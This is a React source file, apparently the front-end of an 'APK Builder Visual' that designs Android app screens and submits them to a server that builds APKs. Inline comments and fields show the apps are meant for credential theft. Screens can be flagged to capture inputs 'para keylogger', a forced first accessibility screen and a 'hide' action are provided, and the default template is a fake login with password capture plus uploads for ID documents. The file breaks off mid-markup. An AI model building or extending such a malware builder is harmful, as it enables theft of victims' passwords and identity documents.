import { useState, useRef, useCallback, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { getApiBaseUrl } from '../services/api';
import {
  ArrowLeft,
  Plus,
  Trash2,
  Type,
  Image,
  Square,
  Smartphone,
  Save,
  Download,
  Eye,
  Copy,
  ChevronUp,
  ChevronDown,
  Layers,
  Keyboard,
  Upload,
  RefreshCw,
  Shield,
  Info
} from 'lucide-react';

// ==================== TIPOS ====================

interface Position {
  x: number;
  y: number;
}

interface Size {
  width: number;
  height: number;
}

interface ElementStyle {
  backgroundColor?: string;
  textColor?: string;
  borderColor?: string;
  borderWidth?: number;
  borderRadius?: number;
  fontSize?: number;
  fontWeight?: string;
  textAlign?: 'left' | 'center' | 'right';
  padding?: number;
  opacity?: number;
}

interface ScreenElement {
  id: string;
  type: 'text' | 'image' | 'input' | 'button' | 'rectangle' | 'circle' | 'logo' | 'file_upload';
  position: Position;
  size: Size;
  content: string;
  style: ElementStyle;
  // Para inputs
  inputType?: 'text' | 'password' | 'numeric' | 'pin';
  inputMaxLength?: number;
  inputPlaceholder?: string;
  inputLabel?: string;
  // Para botões
  buttonAction?: 'accessibility' | 'next' | 'submit' | 'close' | 'home' | 'hide' | 'custom' | 'open_url';
  buttonUrl?: string; // URL para abrir quando buttonAction = 'open_url'
  // Para imagens
  imageUrl?: string;
  imageFile?: string; // base64
  // Para upload de arquivos
  fileTypes?: string[]; // Tipos aceitos: 'image', 'pdf', 'document', 'any'
  fileLabel?: string; // Label para identificar no painel (ex: "DOCUMENTO_RG")
  fileButtonText?: string; // Texto do botão de upload
}

interface APKScreen {
  id: string;
  name: string;
  order: number;
  backgroundColor: string;
  elements: ScreenElement[];
  // Configurações da tela
  isAccessibilityScreen?: boolean; // Tela de acessibilidade (sempre primeira)
  captureInputs?: boolean; // Se deve capturar inputs para keylogger
  nextScreenId?: string | null; // Próxima tela após ação
}

interface APKTemplate {
  id: string;
  name: string;
  description: string;
  appName: string;
  packageName: string;
  screens: APKScreen[];
  theme: {
    primaryColor: string;
    secondaryColor: string;
    accentColor: string;
    textColor: string;
    backgroundColor: string;
  };
  createdAt: string;
  updatedAt: string;
}

// ==================== TEMPLATES PRÉ-DEFINIDOS (NEUTROS) ====================

const DEFAULT_TEMPLATE: APKTemplate = {
  id: 'default-template',
  name: 'Padrão Moderno',
  description: 'Template base neutro com layout moderno',
  appName: 'MeuApp',
  packageName: 'com.example.meuapp',
  theme: {
    primaryColor: '#0ea5e9',
    secondaryColor: '#0369a1',
    accentColor: '#7be2ff',
    textColor: '#FFFFFF',
    backgroundColor: '#051025',
  },
  screens: [
    {
      id: 'splash',
      name: 'Splash',
      order: 0,
      backgroundColor: '#051025',
      isAccessibilityScreen: false,
      elements: [
        { id: 'logo', type: 'image', position: { x: 120, y: 100 }, size: { width: 120, height: 120 }, content: '', style: {}, imageUrl: '/hydra-logo.svg' },
        { id: 'title', type: 'text', position: { x: 20, y: 240 }, size: { width: 320, height: 40 }, content: 'Bem-vindo ao MeuApp', style: { fontSize: 20, fontWeight: 'bold', textColor: '#7be2ff', textAlign: 'center' } },
      ],
    },
    {
      id: 'login',
      name: 'Login',
      order: 1,
      backgroundColor: '#051025',
      elements: [
        { id: 'login-title', type: 'text', position: { x: 20, y: 120 }, size: { width: 320, height: 36 }, content: 'Entrar', style: { fontSize: 22, fontWeight: 'bold', textColor: '#e6f7ff', textAlign: 'center' } },
        { id: 'input-user', type: 'input', position: { x: 40, y: 200 }, size: { width: 280, height: 48 }, content: '', style: { backgroundColor: '#ffffff', textColor: '#00121a', borderRadius: 10, fontSize: 16 }, inputType: 'text', inputPlaceholder: 'Usuário' },
        { id: 'input-pass', type: 'input', position: { x: 40, y: 260 }, size: { width: 280, height: 48 }, content: '', style: { backgroundColor: '#ffffff', textColor: '#00121a', borderRadius: 10, fontSize: 16 }, inputType: 'password', inputPlaceholder: 'Senha' },
        { id: 'btn-login', type: 'button', position: { x: 40, y: 330 }, size: { width: 280, height: 48 }, content: 'Entrar', style: { backgroundColor: '#0ea5e9', textColor: '#00121a', borderRadius: 12, fontSize: 16 }, buttonAction: 'submit' },
      ],
    },
    {
      id: 'success',
      name: 'Sucesso',
      order: 2,
      backgroundColor: '#0b2740',
      elements: [
        { id: 'success-icon', type: 'text', position: { x: 140, y: 150 }, size: { width: 100, height: 80 }, content: '✓', style: { fontSize: 48, textColor: '#00ffcc', textAlign: 'center' } },
        { id: 'success-title', type: 'text', position: { x: 20, y: 260 }, size: { width: 320, height: 50 }, content: 'Operação concluída', style: { fontSize: 20, fontWeight: 'bold', textColor: '#e6f7ff', textAlign: 'center' } },
      ],
    },
  ],
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
};

// ==================== COMPONENTE PRINCIPAL ====================

export default function APKBuilderVisual() {
  const navigate = useNavigate();
  
  // Estado do template
  const [template, setTemplate] = useState<APKTemplate>(DEFAULT_TEMPLATE);
  const [currentScreenIndex, setCurrentScreenIndex] = useState(0);
  const [selectedElementId, setSelectedElementId] = useState<string | null>(null);
  
  // 📦 Templates salvos e histórico
  const [savedTemplates, setSavedTemplates] = useState<APKTemplate[]>([]);
  const [apkHistory, setApkHistory] = useState<{
    id: string;
    name: string;
    date: string;
    templateName: string;
    buildId: string;
    downloadUrl: string;
  }[]>([]);
  const [showSavedTemplates, setShowSavedTemplates] = useState(false);
  const [showApkHistory, setShowApkHistory] = useState(false);
  const [templateName, setTemplateName] = useState('');
  
  // Estados de UI
  const [isDragging, setIsDragging] = useState(false);
  const [dragOffset, setDragOffset] = useState<Position>({ x: 0, y: 0 });
  const [showElementPanel] = useState(true);
  const [showPropertiesPanel] = useState(true);
  const [previewMode, setPreviewMode] = useState(false);
  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [buildStatus, setBuildStatus] = useState('');
  
  // Refs
  const phonePreviewRef = useRef<HTMLDivElement>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);
  
  // Tela atual
  const currentScreen = template.screens[currentScreenIndex];
  const selectedElement = currentScreen?.elements.find(e => e.id === selectedElementId);
  
  // ==================== CARREGAR TEMPLATES E HISTÓRICO DO LOCALSTORAGE ====================
  
  useEffect(() => {
    // Carregar templates salvos
    const saved = localStorage.getItem('apk_visual_templates');
    if (saved) {
      try {
        setSavedTemplates(JSON.parse(saved));
      } catch (e) {
        console.error('Erro ao carregar templates:', e);
      }
    }
    
    // Carregar histórico de APKs
    const history = localStorage.getItem('apk_visual_history');
    if (history) {
      try {
        setApkHistory(JSON.parse(history));
      } catch (e) {
        console.error('Erro ao carregar histórico:', e);
      }
    }
  }, []);
  
  // ==================== FUNÇÕES DE GERENCIAMENTO DE TEMPLATES ====================
  
  const saveTemplate = () => {
    const name = templateName.trim() || `Template ${new Date().toLocaleDateString()}`;
    const newTemplate: APKTemplate = {
      ...template,
      id: `tpl-${Date.now()}`,
      name: name,
      updatedAt: new Date().toISOString(),
    };
    
    const updated = [...savedTemplates.filter(t => t.id !== template.id), newTemplate];
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
    setTemplate(newTemplate);
    setTemplateName('');
    alert(`✅ Template "${name}" salvo com sucesso!`);
  };
  
  const loadTemplate = (tpl: APKTemplate) => {
    setTemplate(tpl);
    setCurrentScreenIndex(0);
    setSelectedElementId(null);
    setShowSavedTemplates(false);
  };
  
  const deleteTemplate = (tplId: string) => {
    if (!confirm('Tem certeza que deseja excluir este template?')) return;
    const updated = savedTemplates.filter(t => t.id !== tplId);
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
  };
  
  const duplicateTemplate = (tpl: APKTemplate) => {
    const newTemplate: APKTemplate = {
      ...tpl,
      id: `tpl-${Date.now()}`,
      name: `${tpl.name} (Cópia)`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    const updated = [...savedTemplates, newTemplate];
    setSavedTemplates(updated);
    localStorage.setItem('apk_visual_templates', JSON.stringify(updated));
  };
  
  const addToHistory = (apkName: string, buildId: string, downloadUrl: string) => {
    const historyEntry = {
      id: `hist-${Date.now()}`,
      name: apkName,
      date: new Date().toISOString(),
      templateName: template.name,
      buildId,
      downloadUrl,
    };
    const updated = [historyEntry, ...apkHistory].slice(0, 50); // Mantém últimos 50
    setApkHistory(updated);
    localStorage.setItem('apk_visual_history', JSON.stringify(updated));
  };
  
  const deleteFromHistory = (historyId: string) => {
    const updated = apkHistory.filter(h => h.id !== historyId);
    setApkHistory(updated);
    localStorage.setItem('apk_visual_history', JSON.stringify(updated));
  };
  
  const downloadApk = (downloadUrl: string, apkName: string) => {
    // Se a URL for relativa, adiciona o base URL
    const fullUrl = downloadUrl.startsWith('http') ? downloadUrl : `${getApiBaseUrl()}${downloadUrl}`;
    
    // Abre em nova aba para download
    const link = document.createElement('a');
    link.href = fullUrl;
    link.download = `${apkName}.apk`;
    link.target = '_blank';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };
  
  const clearHistory = () => {
    if (!confirm('Tem certeza que deseja limpar todo o histórico?')) return;
    setApkHistory([]);
    localStorage.setItem('apk_visual_history', JSON.stringify([]));
  };
  
  const newTemplate = () => {
    if (!confirm('Criar novo template? O template atual será perdido se não salvar.')) return;
    setTemplate({
      ...DEFAULT_TEMPLATE,
      id: `tpl-${Date.now()}`,
      name: 'Novo Template',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    });
    setCurrentScreenIndex(0);
    setSelectedElementId(null);
  };
  
  // ==================== HANDLERS DE ELEMENTOS ====================
  
  const addElement = (type: ScreenElement['type']) => {
    // Define tamanho baseado no tipo
    const width = type === 'text' ? 200 : type === 'input' ? 260 : type === 'button' ? 200 : type === 'file_upload' ? 260 : 100;
    const height = type === 'input' ? 50 : type === 'button' ? 45 : type === 'text' ? 30 : type === 'file_upload' ? 120 : 80;
    
    // Posição centralizada e dentro da área visível
    const x = Math.max(0, Math.min(ANDROID_WIDTH - width, (ANDROID_WIDTH - width) / 2));
    const y = Math.max(0, Math.min(ANDROID_HEIGHT - height, 200));
    
    const newElement: ScreenElement = {
      id: `el-${Date.now()}`,
      type,
      position: { x, y },
      size: { width, height },
      content: type === 'text' ? 'Novo Texto' : type === 'button' ? 'Botão' : type === 'file_upload' ? 'Enviar Documento' : '',
      style: {
        backgroundColor: type === 'button' ? template.theme.primaryColor : type === 'rectangle' ? '#CCCCCC' : type === 'file_upload' ? '#E8E8E8' : undefined,
        textColor: type === 'button' ? '#FFFFFF' : '#333333',
        fontSize: 16,
        borderRadius: type === 'button' ? 25 : type === 'file_upload' ? 10 : 0,
        textAlign: 'center',
      },
      inputType: type === 'input' ? 'text' : undefined,
      inputMaxLength: type === 'input' ? 100 : undefined,
      inputPlaceholder: type === 'input' ? 'Digite aqui...' : undefined,
      buttonAction: type === 'button' ? 'next' : undefined,
      // Para file_upload
      fileTypes: type === 'file_upload' ? ['image', 'pdf', 'document'] : undefined,
      fileLabel: type === 'file_upload' ? 'DOCUMENTO' : undefined,
      fileButtonText: type === 'file_upload' ? 'Selecionar Arquivo' : undefined,
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: [...screen.elements, newElement] }
          : screen
      ),
    }));
    
    setSelectedElementId(newElement.id);
  };
  
  const updateElement = (elementId: string, updates: Partial<ScreenElement>) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? {
              ...screen,
              elements: screen.elements.map(el =>
                el.id === elementId ? { ...el, ...updates } : el
              ),
            }
          : screen
      ),
    }));
  };
  
  const updateElementStyle = (elementId: string, styleUpdates: Partial<ElementStyle>) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? {
              ...screen,
              elements: screen.elements.map(el =>
                el.id === elementId
                  ? { ...el, style: { ...el.style, ...styleUpdates } }
                  : el
              ),
            }
          : screen
      ),
    }));
  };
  
  const deleteElement = (elementId: string) => {
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: screen.elements.filter(el => el.id !== elementId) }
          : screen
      ),
    }));
    setSelectedElementId(null);
  };
  
  const duplicateElement = (elementId: string) => {
    const element = currentScreen.elements.find(e => e.id === elementId);
    if (!element) return;
    
    const newElement: ScreenElement = {
      ...element,
      id: `el-${Date.now()}`,
      position: { x: element.position.x + 20, y: element.position.y + 20 },
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.map((screen, idx) =>
        idx === currentScreenIndex
          ? { ...screen, elements: [...screen.elements, newElement] }
          : screen
      ),
    }));
    
    setSelectedElementId(newElement.id);
  };
  
  // ==================== HANDLERS DE TELA ====================
  
  const addScreen = () => {
    const newScreen: APKScreen = {
      id: `screen-${Date.now()}`,
      name: `Tela ${template.screens.length + 1}`,
      order: template.screens.length,
      backgroundColor: template.theme.backgroundColor,
      elements: [],
    };
    
    setTemplate(prev => ({
      ...prev,
      screens: [...prev.screens, newScreen],
    }));
    
    setCurrentScreenIndex(template.screens.length);
  };
  
  const deleteScreen = (screenIndex: number) => {
    if (template.screens.length <= 1) return;
    
    setTemplate(prev => ({
      ...prev,
      screens: prev.screens.filter((_, idx) => idx !== screenIndex),
    }));
    
    if (currentScreenIndex >= screenIndex && currentScreenIndex > 0) {
      setCurrentScreenIndex(currentScreenIndex - 1);
    }
  };
  
  const moveScreen = (screenIndex: number, direction: 'up' | 'down') => {
    const newIndex = direction === 'up' ? screenIndex - 1 : screenIndex + 1;
    if (newIndex < 0 || newIndex >= template.screens.length) return;
    
    setTemplate(prev => {
      const newScreens = [...prev.screens];
      [newScreens[screenIndex], newScreens[newIndex]] = [newScreens[newIndex], newScreens[screenIndex]];
      return { ...prev, screens: newScreens.map((s, i) => ({ ...s, order: i })) };
    });
    
    setCurrentScreenIndex(newIndex);
  };
  
  // ==================== HANDLERS DE DRAG ====================
  
  // Dimensões do celular (base Android)
  const ANDROID_WIDTH = 380; // Coordenadas Android
  const ANDROID_HEIGHT = 800;
  
  const handleMouseDown = (e: React.MouseEvent, elementId: string) => {
    if (previewMode) return;
    e.stopPropagation();
    
    const element = currentScreen.elements.find(el => el.id === elementId);
    if (!element) return;
    
    setSelectedElementId(elementId);
    setIsDragging(true);
    
    const rect = (e.target as HTMLElement).getBoundingClientRect();
    setDragOffset({
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    });
  };
  
  const handleMouseMove = useCallback((e: React.MouseEvent) => {
    if (!isDragging || !selectedElementId || !phonePreviewRef.current) return;
    
    const element = currentScreen?.elements.find(el => el.id === selectedElementId);
    if (!element) return;
    
    const previewRect = phonePreviewRef.current.getBoundingClientRect();
    
    // Calcula escala baseada no tamanho real do preview
    const scaleX = previewRect.width / ANDROID_WIDTH;
    const scaleY = previewRect.height / ANDROID_HEIGHT;
    
    // Posição do mouse relativa ao preview
    const mouseX = e.clientX - previewRect.left - (dragOffset.x * scaleX);
    const mouseY = e.clientY - previewRect.top - (dragOffset.y * scaleY);
    
    // Converte para coordenadas Android
    let newX = mouseX / scaleX;
    let newY = mouseY / scaleY;
    
    // Tamanho do elemento
    const elWidth = element.size.width;
    const elHeight = element.size.height;
    
    // LIMITA dentro da área do celular (não deixa sair!)
    // Margem mínima de 0, máxima = largura/altura - tamanho do elemento
    newX = Math.max(0, Math.min(ANDROID_WIDTH - elWidth, newX));
    newY = Math.max(0, Math.min(ANDROID_HEIGHT - elHeight, newY));
    
    updateElement(selectedElementId, {
      position: {
        x: Math.round(newX),
        y: Math.round(newY),
      },
    });
  }, [isDragging, selectedElementId, dragOffset, currentScreen]);
  
  const handleMouseUp = () => {
    setIsDragging(false);
  };
  
  // ==================== HANDLERS DE IMAGEM ====================
  
  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !selectedElementId) return;
    
    const reader = new FileReader();
    reader.onload = (event) => {
      const base64 = event.target?.result as string;
      updateElement(selectedElementId, { imageFile: base64 });
    };
    reader.readAsDataURL(file);
  };
  
  // ==================== BUILD APK ====================
  
  const handleBuildAPK = async () => {
    setIsBuilding(true);
    setBuildProgress(0);
    setBuildStatus('Iniciando build...');
    
    try {
      const token = localStorage.getItem('token');
      
      // 1. Inicia o build
      const formData = new FormData();
      formData.append('template', JSON.stringify({
        screens: template.screens,
        theme: template.theme,
        appName: template.appName,
        packageName: template.packageName,
      }));
      formData.append('app_name', template.appName);
      
      // Criar um blob de ícone temporário
      const iconBlob = new Blob([new Uint8Array(100)], { type: 'image/png' });
      formData.append('icon', iconBlob, 'icon.png');
      
      setBuildStatus('Enviando configuração...');
      setBuildProgress(5);
      
      const response = await fetch(`${getApiBaseUrl()}/api/build-apk-visual`, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${token}` },
        body: formData,
      });
      
      if (!response.ok) {
        throw new Error('Erro ao iniciar build');
      }
      
      const buildResult = await response.json();
      const buildId = buildResult.build_id;
      
      setBuildStatus('Build iniciado, aguarde...');
      setBuildProgress(10);
      
      // 2. Polling de status do build
      let attempts = 0;
      const maxAttempts = 120; // 2 minutos máximo
      
      while (attempts < maxAttempts) {
        await new Promise(r => setTimeout(r, 1000)); // Espera 1 segundo
        
        const statusResponse = await fetch(`${getApiBaseUrl()}/api/build-visual-status/${buildId}`, {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        
        if (!statusResponse.ok) {
          attempts++;
          continue;
        }
        
        const status = await statusResponse.json();
        
        setBuildProgress(status.progress || 0);
        setBuildStatus(status.message || 'Processando...');
        
        if (status.status === 'success' || status.status === 'done') {
          // Build concluído!
          setBuildProgress(100);
          setBuildStatus('✅ APK pronto para download!');
          
          // 📦 Adiciona ao histórico com buildId e downloadUrl
          if (status.download_url) {
            addToHistory(template.appName, buildId, status.download_url);
            
            // Abre o download automaticamente
            window.open(`${getApiBaseUrl()}${status.download_url}`, '_blank');
          }
          
          setTimeout(() => {
            setIsBuilding(false);
            setBuildProgress(0);
            setBuildStatus('');
          }, 3000);
          
          return;
        }
        
        if (status.status === 'error') {
          throw new Error(status.message || 'Erro no build');
        }
        
        attempts++;
      }
      
      throw new Error('Timeout: Build demorou muito');
      
    } catch (error: any) {
      console.error('Erro no build:', error);
      setBuildStatus(`❌ Erro: ${error.message || 'Tente novamente'}`);
      
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 3000);
    }
  };
  
  // ==================== RENDER ELEMENT ====================
  
  // Garante que elemento está dentro dos limites
  const clampPosition = (element: ScreenElement) => {
    const maxX = ANDROID_WIDTH - element.size.width;
    const maxY = ANDROID_HEIGHT - element.size.height;
    return {
      x: Math.max(0, Math.min(maxX, element.position.x)),
      y: Math.max(0, Math.min(maxY, element.position.y)),
    };
  };
  
  const renderElement = (element: ScreenElement, isPreview: boolean = false) => {
    const isSelected = selectedElementId === element.id && !isPreview;
    
    // Posição corrigida (sempre dentro da área)
    const pos = clampPosition(element);
    
    // Usa porcentagem para ser responsivo
    const leftPercent = (pos.x / ANDROID_WIDTH) * 100;
    const topPercent = (pos.y / ANDROID_HEIGHT) * 100;
    const widthPercent = (element.size.width / ANDROID_WIDTH) * 100;
    const heightPercent = (element.size.height / ANDROID_HEIGHT) * 100;
    
    const baseStyle: React.CSSProperties = {
      position: 'absolute',
      left: `${leftPercent}%`,
      top: `${topPercent}%`,
      width: `${widthPercent}%`,
      height: `${heightPercent}%`,
      backgroundColor: element.style.backgroundColor,
      color: element.style.textColor,
      borderRadius: element.style.borderRadius,
      fontSize: `${(element.style.fontSize || 14) / 14}rem`,
      fontWeight: element.style.fontWeight as any,
      textAlign: element.style.textAlign,
      padding: element.style.padding,
      opacity: element.style.opacity,
      border: isSelected ? '2px solid #00BFFF' : element.style.borderWidth ? `${element.style.borderWidth}px solid ${element.style.borderColor || '#000'}` : 'none',
      cursor: isPreview ? 'default' : 'move',
      display: 'flex',
      alignItems: 'center',
      justifyContent: element.style.textAlign === 'center' ? 'center' : element.style.textAlign === 'right' ? 'flex-end' : 'flex-start',
      boxShadow: isSelected ? '0 0 10px rgba(0,191,255,0.5)' : undefined,
      zIndex: isSelected ? 1000 : 1,
      userSelect: 'none',
      overflow: 'hidden',
    };
    
    const handleClick = (e: React.MouseEvent) => {
      e.stopPropagation();
      if (!isPreview) setSelectedElementId(element.id);
    };
    
    switch (element.type) {
      case 'text':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.content}
          </div>
        );
        
      case 'button':
        return (
          <button
            key={element.id}
            style={{
              ...baseStyle,
              border: isSelected ? '2px solid #00BFFF' : 'none',
              outline: 'none',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.content}
          </button>
        );
        
      case 'input':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <input
              type={element.inputType === 'pin' || element.inputType === 'password' ? 'password' : 'text'}
              placeholder={element.inputPlaceholder}
              maxLength={element.inputMaxLength}
              style={{
                width: '100%',
                height: '100%',
                border: 'none',
                background: 'transparent',
                fontSize: 'inherit',
                color: 'inherit',
                textAlign: element.style.textAlign || 'center',
                outline: 'none',
                pointerEvents: isPreview ? 'auto' : 'none',
              }}
              inputMode={element.inputType === 'numeric' || element.inputType === 'pin' ? 'numeric' : 'text'}
            />
          </div>
        );
        
      case 'image':
      case 'logo':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: element.imageFile ? 'transparent' : '#E0E0E0',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            {element.imageFile ? (
              <img
                src={element.imageFile}
                alt=""
                style={{ width: '100%', height: '100%', objectFit: 'contain' }}
              />
            ) : (
              <Image size={32} color="#999" />
            )}
          </div>
        );
        
      case 'rectangle':
        return (
          <div
            key={element.id}
            style={baseStyle}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          />
        );
        
      case 'circle':
        return (
          <div
            key={element.id}
            style={{ ...baseStyle, borderRadius: '50%' }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          />
        );
        
      case 'file_upload':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: element.style.backgroundColor || '#F5F5F5',
              flexDirection: 'column',
              gap: '8px',
              padding: '12px',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <div style={{ 
              width: '40px', 
              height: '40px', 
              borderRadius: '50%',
              backgroundColor: '#4CAF50',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}>
              <Upload size={20} color="#FFF" />
            </div>
            <span style={{ fontSize: '12px', color: '#666', textAlign: 'center' }}>
              {element.content || 'Enviar Documento'}
            </span>
            <button
              style={{
                backgroundColor: '#4CAF50',
                color: '#FFF',
                padding: '8px 16px',
                borderRadius: '6px',
                border: 'none',
                fontSize: '12px',
                cursor: 'pointer',
              }}
            >
              {element.fileButtonText || 'Selecionar Arquivo'}
            </button>
            <span style={{ fontSize: '10px', color: '#999' }}>
              {element.fileTypes?.map(t => t === 'image' ? 'IMG' : t === 'pdf' ? 'PDF' : t === 'document' ? 'DOC' : '*').join(', ') || 'Todos'}
            </span>
          </div>
        );
        
      default:
        return null;
    }
  };
  
  // ==================== RENDER ====================
  
  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="bg-gray-800 border-b border-gray-700 px-4 py-3 flex items-center justify-between">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate('/build-apk')}
            className="flex items-center gap-2 text-gray-400 hover:text-white transition-colors"
          >
            <ArrowLeft size={20} />
            Voltar
          </button>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center gap-2">
            <Smartphone className="text-orange-500" size={24} />
            <span className="text-lg font-semibold">APK Builder Visual</span>
          </div>
        </div>
        
        <div className="flex items-center gap-2">
          {/* Novo Template */}
          <button
            onClick={newTemplate}
            className="flex items-center gap-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors text-sm"
          >
            <Plus size={16} />
            Novo
          </button>
          
          {/* Templates Salvos */}
          <button
            onClick={() => setShowSavedTemplates(true)}
            className="flex items-center gap-1 px-3 py-2 bg-blue-700 hover:bg-blue-600 rounded-lg transition-colors text-sm"
          >
            <Layers size={16} />
            Modelos ({savedTemplates.length})
          </button>
          
          {/* Histórico */}
          <button
            onClick={() => setShowApkHistory(true)}
            className="flex items-center gap-1 px-3 py-2 bg-purple-700 hover:bg-purple-600 rounded-lg transition-colors text-sm"
          >
            <Copy size={16} />
            Histórico ({apkHistory.length})
          </button>
          
          <div className="h-6 w-px bg-gray-600" />
          
          {/* Preview Mode Toggle */}
          <button
            onClick={() => setPreviewMode(!previewMode)}
            className={`flex items-center gap-1 px-3 py-2 rounded-lg transition-colors text-sm ${
              previewMode ? 'bg-green-600 text-white' : 'bg-gray-700 hover:bg-gray-600'
            }`}
          >
            <Eye size={16} />
            {previewMode ? 'Editando' : 'Preview'}
          </button>
          
          {/* Save Template */}
          <button
            onClick={saveTemplate}
            className="flex items-center gap-1 px-3 py-2 bg-green-700 hover:bg-green-600 rounded-lg transition-colors text-sm"
          >
            <Save size={16} />
            Salvar
          </button>
          
          {/* Build APK */}
          <button
            onClick={handleBuildAPK}
            disabled={isBuilding}
            className="flex items-center gap-1 px-4 py-2 bg-orange-600 hover:bg-orange-500 rounded-lg transition-colors disabled:opacity-50"
          >
            {isBuilding ? <RefreshCw size={16} className="animate-spin" /> : <Download size={16} />}
            {isBuilding ? `${buildProgress}%` : 'Build APK'}
          </button>
        </div>
      </header>
      
      {/* Build Progress */}
      {isBuilding && (
        <div className="bg-gray-800 border-b border-gray-700 px-4 py-2">
          <div className="flex items-center gap-4">
            <div className="flex-1 bg-gray-700 rounded-full h-2">
              <div
                className="bg-orange-500 h-2 rounded-full transition-all duration-300"
                style={{ width: `${buildProgress}%` }}
              />
            </div>
            <span className="text-sm text-gray-400">{buildStatus}</span>
          </div>
        </div>
      )}
      
      <div className="flex h-[calc(100vh-64px)]">
        {/* Left Panel - Elements */}
        {showElementPanel && !previewMode && (
          <div className="w-64 bg-gray-800 border-r border-gray-700 overflow-y-auto">
            <div className="p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Adicionar Elementos</h3>
              
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => addElement('text')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Type size={20} />
                  <span className="text-xs">Texto</span>
                </button>
                <button
                  onClick={() => addElement('button')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Square size={20} />
                  <span className="text-xs">Botão</span>
                </button>
                <button
                  onClick={() => addElement('input')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Keyboard size={20} />
                  <span className="text-xs">Input</span>
                </button>
                <button
                  onClick={() => addElement('image')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Image size={20} />
                  <span className="text-xs">Imagem</span>
                </button>
                <button
                  onClick={() => addElement('logo')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Shield size={20} />
                  <span className="text-xs">Logo</span>
                </button>
                <button
                  onClick={() => addElement('rectangle')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-lg transition-colors"
                >
                  <Square size={20} />
                  <span className="text-xs">Retângulo</span>
                </button>
                <button
                  onClick={() => addElement('file_upload')}
                  className="flex flex-col items-center gap-2 p-3 bg-green-700 hover:bg-green-600 rounded-lg transition-colors"
                >
                  <Upload size={20} />
                  <span className="text-xs">Upload</span>
                </button>
              </div>
            </div>
            
            <div className="border-t border-gray-700 p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Telas</h3>
              
              <div className="space-y-2">
                {template.screens.map((screen, idx) => (
                  <div
                    key={screen.id}
                    className={`flex items-center gap-2 p-2 rounded-lg cursor-pointer transition-colors ${
                      idx === currentScreenIndex ? 'bg-orange-600' : 'bg-gray-700 hover:bg-gray-600'
                    }`}
                    onClick={() => setCurrentScreenIndex(idx)}
                  >
                    <Layers size={16} />
                    <span className="flex-1 text-sm truncate">{screen.name}</span>
                    {/* Indicadores */}
                    <div className="flex gap-1">
                      {idx === 0 && (
                        <span className="px-1 py-0.5 bg-blue-500 text-[8px] rounded" title="Primeira tela">1ª</span>
                      )}
                      {idx === template.screens.length - 1 && (
                        <span className="px-1 py-0.5 bg-green-500 text-[8px] rounded" title="Última tela (deve ter botão Fechar)">FIM</span>
                      )}
                      {screen.captureInputs && (
                        <span className="px-1 py-0.5 bg-red-500 text-[8px] rounded" title="Captura senhas">🔐</span>
                      )}
                    </div>
                    {template.screens.length > 1 && (
                      <button
                        onClick={(e) => { e.stopPropagation(); deleteScreen(idx); }}
                        className="p-1 hover:bg-red-500 rounded transition-colors"
                      >
                        <Trash2 size={14} />
                      </button>
                    )}
                  </div>
                ))}
                
                <button
                  onClick={addScreen}
